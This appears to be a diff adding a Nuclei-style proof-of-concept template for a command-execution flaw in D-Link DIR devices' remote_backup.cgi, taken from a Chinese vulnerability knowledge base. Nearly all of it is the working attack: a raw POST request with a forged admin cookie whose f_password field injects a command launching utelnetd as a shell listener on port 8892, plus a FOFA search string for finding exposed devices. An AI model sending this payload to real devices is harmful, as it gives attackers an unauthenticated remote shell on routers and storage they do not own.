@@ -1,0 +1,48 @@
+id: poc-hbz56ggeyvfoknm3
+info:
+  name: D-Link remote_backup.cgi存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hbz56ggeyvfoknm3'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hbz56ggeyvfoknm3
+    fofa: '"D-Link-DIR"'
+http:
+- raw:
+  - 'POST /cgi-bin/remote_backup.cgi HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br
+
+    Content-Type: application/x-www-form-urlencoded
+
+    X-Requested-With: XMLHttpRequest
+
+    Content-Length: 276
+
+    Origin: [http://192.168.0.16](http://192.168.0.16)
+
+    Connection: keep-alive
+
+    Referer: [http://192.168.0.16/web/backup_mgr/local_main.html](http://192.168.0.16/web/backup_mgr/local_main.html)
+
+    Cookie: username=admin
+
+    Priority: u=0
+
+
+    cmd=cgi_set_rsync_server&f_password='';utelnetd -p 8892 -l /bin/sh;''&f_onoff=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
